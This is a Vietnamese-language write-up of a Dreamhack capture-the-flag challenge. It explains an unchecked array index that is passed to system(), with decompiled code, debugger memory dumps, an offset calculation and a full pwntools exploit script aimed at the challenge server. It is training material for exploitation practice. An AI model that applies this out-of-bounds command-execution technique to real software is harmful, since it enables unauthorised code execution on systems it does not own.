# Challenge: Out Of Bound

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/oob/out_of_bound)
- Khi thực thi, chương trình cho user thay đổi biến name với 16 bytes, và 1 input int đọc dữ liệu trong buf.
- Sau đó thực thi system(buf[input]) và exit.
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _DWORD v4[3]; // [esp+8h] [ebp-10h] BYREF

  v4[1] = __readgsdword(0x14u);
  initialize();
  printf("Admin name: ");
  read(0, &name, 16u);
  printf("What do you want?: ");
  __isoc99_scanf("%d", v4);
  system((&command)[v4[0]]);
  return 0;
}
```
- Checksec:
```
+ Arch:       i386-32-little
+ RELRO:      Partial RELRO
+ Stack:      Canary found
+ NX:         NX enabled
+ PIE:        No PIE (0x8048000)
+ Stripped:   No
```
## Giải pháp
- Khi debug, tôi thấy rằng dữ liệu name nhập vào nằm sau dữ liệu **choice** _(input int)_ và địa chỉ nằm trong stack.
- Kiểm tra stack, tôi nhận được đoạn sau:
```
pwndbg> x/50xg 0x804a000
0x804a000:      0xf7ffda6008049f14      0x080484a6f7fd8e40
0x804a010 <printf@got.plt>:     0x080484c6080484b6      0x080484e6080484d6
0x804a020 <puts@got.plt>:       0x08048506080484f6      0xf7d8301008048516
0x804a030 <setvbuf@got.plt>:    0x0804854608048536      0x0000000000000000
0x804a040:      0x0000000000000000      0x0000000000000000
0x804a050:      0x0000000000000000      0x0000000000000000
0x804a060 <command>:    0x080487f4080487f0      0x080487fa080487f7
0x804a070 <command+16>: 0x00000000080487fd      0x0000000000000000
0x804a080 <command+32>: 0x0000000000000000      0x0000000000000000
0x804a090:      0x0000000000000000      0x0000000000000000
0x804a0a0 <stdin@@GLIBC_2.0>:   0xf7f90ce0f7f905a0      0x0000000000000000
0x804a0b0 <name+4>:     0x0000000000000000      0x0000000000000000
```
- Biến choice không bị rằng buộc bởi bất kì thứ gì, do đó có thể khai thác **Out Of Bound** tại đây.
- Từ đó, hướng khai thác đó là đẩy "cat flag" vào name nhưng để system thực thi được thì cần đưa địa chỉ hướng tới "cat flag".
> Sau đó khai thác **OOB** để hướng tới địa chỉ "cat flag" để system thực hiện đọc flag.

 ## Quá trình
 - Do PIE tắt nên ta có thể dùng nó để lấy địa chỉ của name và trỏ thẳng tới "cat flag". Nhưng do file 32 bytes nên ta thêm 4 bytes để trỏ tới dữ liệu cần.
```
Payload = flat(
  exe.sym['name'] + 4,
  b'cat flag',
)
```
- Tiếp theo, tính offset trở tới name bằng công thức: _Offset = (Địa chỉ cần tới - Địa chỉ bắt đầu) / 8 * 2_
```
pwndbg> p/d (0x804a0b0 - 0x804a060)/8 * 2
$5 = 20
```
- Offset 20 là đang trỏ tới name+4 do đó cần trừ 1 để tới name => Offset = 19
> Sau khi trở tới địa chỉ name system sẽ thực hiện "cat flag" và có được flag.

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('out_of_bound', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+97

        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 12619)
else:
    p = process([exe.path])
# GDB()

payload = flat(
    exe.sym['name'] + 4,
    b'cat flag',
    )
sla(b'name: ', payload.ljust(16, b'\0'))
sla(b'want?: ', b'19')

p.interactive()
```
